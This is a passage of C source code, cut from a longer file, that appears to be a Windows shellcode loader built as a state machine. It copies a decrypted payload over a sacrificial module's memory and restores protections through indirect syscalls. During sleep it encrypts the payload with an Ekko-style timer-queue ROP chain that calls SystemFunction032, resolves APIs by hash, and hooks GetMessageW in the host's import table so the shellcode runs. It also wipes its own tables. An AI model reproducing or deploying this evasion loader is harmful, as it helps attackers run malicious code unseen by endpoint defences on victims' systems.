            PBYTE pSource = (PBYTE)Table->PayloadBuffer; // Pulling from the buffer we decrypted in Deobfuscate

            for (SIZE_T i = 0; i < Table->PayloadSize; i++)
            {
                pStompTarget[i] = pSource[i]; // No more SHELLCODE
            }

            memset(Table->PayloadBuffer, 0, Table->PayloadSize);

            // restore original memory protections (PAGE_EXECUTE_READ)
            PRINT("    [-] Restoring memory protections (0x%X)...\n", uOldProtect);

            SetSSn(Table->Sys.NtProtectVirtualMemory.wSSN, Table->Sys.NtProtectVirtualMemory.pSyscallAddress);
            ULONG uDummy = 0;
            status = RunSyscall((HANDLE)-1, &pBaseAddress, &sProtectSize, uOldProtect, &uDummy);

            if (status != 0x00000000)
            {
                PRINT("[!] CRITICAL: NtProtectVirtualMemory (Restore) failed: 0x%08X\n", status);
            }

            currentState = Ekko;
        }
        break;

        case Ekko:
        {
            PRINT("[*] State: Ekko \n");

            HMODULE hKernel32 = (HMODULE)CustomGetModuleHandle(0x7040EE75);
            HMODULE hNtdll = (HMODULE)Table->NtdllBase;

            if (!hKernel32 || !hNtdll)
            {
                currentState = Exit;
                break;
            }

            fnCreateEventW pCreateEventW = (fnCreateEventW)CustomGetProcAddress(hKernel32, 0x5d01f1b2);
            fnCreateTimerQueue pCreateTimerQueue = (fnCreateTimerQueue)CustomGetProcAddress(hKernel32, 0x5e1c3ff);
            fnCreateTimerQueueTimer pCreateTimerQueueTimer = (fnCreateTimerQueueTimer)CustomGetProcAddress(hKernel32, 0x117296a0);
            fnWaitForSingleObject pWaitForSingleObject = (fnWaitForSingleObject)CustomGetProcAddress(hKernel32, 0xeccda1ba);
            fnSetEvent pSetEvent = (fnSetEvent)CustomGetProcAddress(hKernel32, 0x877ebbd3);
            fnDeleteTimerQueue pDeleteTimerQueue = (fnDeleteTimerQueue)CustomGetProcAddress(hKernel32, 0xa3b4107e);
            fnCloseHandle pCloseHandle = (fnCloseHandle)CustomGetProcAddress(hKernel32, 0x3870ca07);
            fnVirtualProtect pVirtualProtect = (fnVirtualProtect)CustomGetProcAddress(hKernel32, 0x844ff18d);
            fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)CustomGetProcAddress(hKernel32, 0x5fbff0fb);
            fnRtlCaptureContext pRtlCaptureContext = (fnRtlCaptureContext)CustomGetProcAddress(hNtdll, 0x7733eed0);

            fnGetProcAddress pGetProcAddress = (fnGetProcAddress)CustomGetProcAddress(hKernel32, 0xcf31bb1f);

            HMODULE hAdvapi32 = NULL;
            PVOID pSysFunc032 = NULL;

            if (pLoadLibraryA && pGetProcAddress) {
                hAdvapi32 = pLoadLibraryA("Advapi32.dll");

                if (hAdvapi32) {
                    // Let the native OS handle the forwarder maze!
                    pSysFunc032 = (PVOID)pGetProcAddress(hAdvapi32, "SystemFunction032");
                }
            }

            PVOID pNtContinue = Table->Sys.NtContinue.pSyscallAddress;

            //////----- DEBUG PRINTS +++
            PRINT("    [+] Ekko Dependency Resolution Map:\n");
            PRINT("        - pCreateEventW          : 0x%p\n", pCreateEventW);
            PRINT("        - pCreateTimerQueue      : 0x%p\n", pCreateTimerQueue);
            PRINT("        - pCreateTimerQueueTimer : 0x%p\n", pCreateTimerQueueTimer);
            PRINT("        - pWaitForSingleObject   : 0x%p\n", pWaitForSingleObject);
            PRINT("        - pSetEvent              : 0x%p\n", pSetEvent);
            PRINT("        - pDeleteTimerQueue      : 0x%p\n", pDeleteTimerQueue);
            PRINT("        - pCloseHandle           : 0x%p\n", pCloseHandle);
            PRINT("        - pVirtualProtect        : 0x%p\n", pVirtualProtect);
            PRINT("        - pLoadLibraryA          : 0x%p\n", pLoadLibraryA);
            PRINT("        - pRtlCaptureContext     : 0x%p\n", pRtlCaptureContext);
            PRINT("        - pGetProcAddress        : 0x%p\n", pGetProcAddress);
            PRINT("        - pSysFunc032            : 0x%p\n", pSysFunc032);
            PRINT("        - pNtContinue            : 0x%p\n", pNtContinue);

            if (!pCreateEventW || !pCreateTimerQueue || !pCreateTimerQueueTimer || !pWaitForSingleObject ||
                !pSetEvent || !pDeleteTimerQueue || !pCloseHandle || !pVirtualProtect || !pLoadLibraryA ||
                !pRtlCaptureContext || !pGetProcAddress || !pSysFunc032 || !pNtContinue)
            {
                PRINT("[!] CRITICAL: Failed to resolve Ekko dependencies\n");
                currentState = Exit;
                break;
            }

            // MUST BE STATIC TO SURVIVE THE SLEEP
            static CONTEXT CtxThread = { 0 }, RopProtRW = { 0 }, RopMemEnc = { 0 }, RopDelay = { 0 }, RopMemDec = { 0 }, RopProtRX = { 0 }, RopSetEvt = { 0 };
            static DWORD OldProtect = 0; // VirtualProtect needs a persistent memory address to write to!

            static CHAR KeyBuf[16] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };
            static USTRING Key = { 0 };
            static USTRING Img = { 0 };

            // init the static USTRING structs at runtime
            Key.Buffer = KeyBuf;
            Key.Length = 16;
            Key.MaximumLength = 16;

            Img.Buffer = Table->SacrificialEntryPoint;
            Img.Length = (DWORD)Table->PayloadSize;
            Img.MaximumLength = (DWORD)Table->PayloadSize;

            HANDLE hTimerQueue = NULL, hNewTimer = NULL, hEvent = NULL;

            // EXECUTE
            hEvent = pCreateEventW(0, 0, 0, 0);
            hTimerQueue = pCreateTimerQueue();

            PRINT("    [-] Capturing Worker Thread Context...\n");

            if (pCreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pRtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD))
            {
                pWaitForSingleObject(hEvent, 0x32);

                PRINT("    [-] Building ROP Contexts...\n");
                memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
                memcpy(&RopMemEnc, &CtxThread, sizeof(CONTEXT));
                memcpy(&RopDelay, &CtxThread, sizeof(CONTEXT));
                memcpy(&RopMemDec, &CtxThread, sizeof(CONTEXT));
                memcpy(&RopProtRX, &CtxThread, sizeof(CONTEXT));
                memcpy(&RopSetEvt, &CtxThread, sizeof(CONTEXT));

                // VirtualProtect PAGE_READWRITE
                RopProtRW.Rsp -= 8;
                RopProtRW.Rip = (DWORD64)pVirtualProtect;
                RopProtRW.Rcx = (DWORD64)Table->SacrificialEntryPoint;
                RopProtRW.Rdx = (DWORD64)Table->PayloadSize;
                RopProtRW.R8 = PAGE_READWRITE;
                RopProtRW.R9 = (DWORD64)&OldProtect;

                // SystemFunction032 Encrypt
                RopMemEnc.Rsp -= 8;
                RopMemEnc.Rip = (DWORD64)pSysFunc032;
                RopMemEnc.Rcx = (DWORD64)&Img;
                RopMemEnc.Rdx = (DWORD64)&Key;

                // WaitForSingleObject Delay
                RopDelay.Rsp -= 8;
                RopDelay.Rip = (DWORD64)pWaitForSingleObject;
                RopDelay.Rcx = (DWORD64)(HANDLE)-1;
                RopDelay.Rdx = 5000;

                // SystemFunction032 Decrypt
                RopMemDec.Rsp -= 8;
                RopMemDec.Rip = (DWORD64)pSysFunc032;
                RopMemDec.Rcx = (DWORD64)&Img;
                RopMemDec.Rdx = (DWORD64)&Key;

                // VirtualProtect PAGE_EXECUTE_READ
                RopProtRX.Rsp -= 8;
                RopProtRX.Rip = (DWORD64)pVirtualProtect;
                RopProtRX.Rcx = (DWORD64)Table->SacrificialEntryPoint;
                RopProtRX.Rdx = (DWORD64)Table->PayloadSize;
                RopProtRX.R8 = PAGE_EXECUTE_READ;
                RopProtRX.R9 = (DWORD64)&OldProtect;

                // SetEvent
                RopSetEvt.Rsp -= 8;
                RopSetEvt.Rip = (DWORD64)pSetEvent;
                RopSetEvt.Rcx = (DWORD64)hEvent;

                PRINT("    [-] Queuing Timer execution chain...\n");

                pCreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
                pCreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
                pCreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopDelay, 300, 0, WT_EXECUTEINTIMERTHREAD);
                pCreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD);
                pCreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD);
                pCreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD);

                PRINT("    [-] Waiting for Event (Payload Encrypted, Sleeping...)\n");
                pWaitForSingleObject(hEvent, INFINITE);
                PRINT("    [+] Sleep cycle complete\n");
            }

            pDeleteTimerQueue(hTimerQueue);
            pCloseHandle(hEvent);

            currentState = IAThook;
        }
        break;

        case IAThook:
        {
            PRINT("[*] State: IAThook\n");

            PVOID pHostBase = Table->Peb->ImageBaseAddress;
            PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pHostBase;
            PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pHostBase + pDos->e_lfanew);

            IMAGE_DATA_DIRECTORY importDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
            if (importDir.VirtualAddress == 0) currentState = Exit;

            PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pHostBase + importDir.VirtualAddress);
            PVOID pIatTargetAddress = NULL;

            while (pImportDesc->Name != 0)
            {
                PIMAGE_THUNK_DATA pOriginalThunk = (PIMAGE_THUNK_DATA)((PBYTE)pHostBase + pImportDesc->OriginalFirstThunk);
                PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)((PBYTE)pHostBase + pImportDesc->FirstThunk);

                while (pOriginalThunk->u1.AddressOfData != 0)
                {
                    if ((pOriginalThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) == 0)
                    {
                        PIMAGE_IMPORT_BY_NAME pImportName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)pHostBase + pOriginalThunk->u1.AddressOfData);

                        if (HashStringA((PCHAR)pImportName->Name) == HASH_GETMESSAGEW)
                        {
                            pIatTargetAddress = (PVOID)&pFirstThunk->u1.Function;
                            PRINT("    [-] Found GetMessageW in IAT at: 0x%p\n", pIatTargetAddress);
                            break;
                        }
                    }
                    pOriginalThunk++;
                    pFirstThunk++;
                }
                if (pIatTargetAddress != NULL) break;
                pImportDesc++;
            }

            if (pIatTargetAddress == NULL)
            {
                PRINT("[!] CRITICAL: Failed to find GetMessageW in IAT.\n");
                currentState = Exit;
            }

            PRINT("    [-] Hooking IAT. Redirecting to 0x%p...\n", Table->SacrificialEntryPoint);

            ULONG oldProtect = 0;
            PVOID pProtectAddress = pIatTargetAddress;
            SIZE_T sProtectSize = sizeof(PVOID);

            SetSSn(Table->Sys.NtProtectVirtualMemory.wSSN, Table->Sys.NtProtectVirtualMemory.pSyscallAddress);
            RunSyscall((HANDLE)-1, &pProtectAddress, &sProtectSize, PAGE_READWRITE, &oldProtect);

            *(volatile PVOID*)pIatTargetAddress = Table->SacrificialEntryPoint;

            ULONG dummy = 0;
            SetSSn(Table->Sys.NtProtectVirtualMemory.wSSN, Table->Sys.NtProtectVirtualMemory.pSyscallAddress);
            RunSyscall((HANDLE)-1, &pProtectAddress, &sProtectSize, oldProtect, &dummy);

            currentState = Cleanup;
        }
        break;

        case Cleanup:
        {
            PRINT("[*] State: Cleanup\n");
            PRINT("    [-] Zeroing VARIABLE_TABLE...\n");

            volatile BYTE* pTable = (volatile BYTE*)Table;
            for (SIZE_T i = 0; i < sizeof(VARIABLE_TABLE); i++)
            {
                pTable[i] = 0;
            }

            PRINT("[+] Cleanup complete! Moving to Wait...\n");
            currentState = Wait;
        }
        break;

        case Wait:
        {
            PRINT("[*] State: Wait\n");
            PRINT("    [-] Triggering GetMessageW (Executing Shellcode)...\n");

            // The moment this line executes, the IAT redirects the flow to Table->SacrificialEntryPoint
            MSG msg;
            GetMessageW(&msg, NULL, 0, 0);
        }
        break;

        }
    }

    return 0;
}
